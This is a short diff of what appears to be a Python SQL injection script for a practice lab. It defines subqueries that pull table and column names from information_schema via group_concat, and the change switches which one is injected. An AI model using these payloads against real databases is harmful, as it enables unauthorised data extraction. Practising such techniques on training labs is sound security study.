@@ -2,7 +2,7 @@
  * @Author whale4u
  * @Date 2021/4/30
  * @Version 1.0
- """
+"""
 
 import string
 
@@ -56,5 +56,5 @@ mark = "Dumb"
 obj_t = "(select group_concat(table_name) from information_schema.tables where table_schema=database())"
 obj_c = "(select group_concat(column_name) from information_schema.columns where table_schema=database())"
 
-test1 = GetInject(url, mark, obj_c)
+test1 = GetInject(url, mark, obj_t)
 test1.get_name()
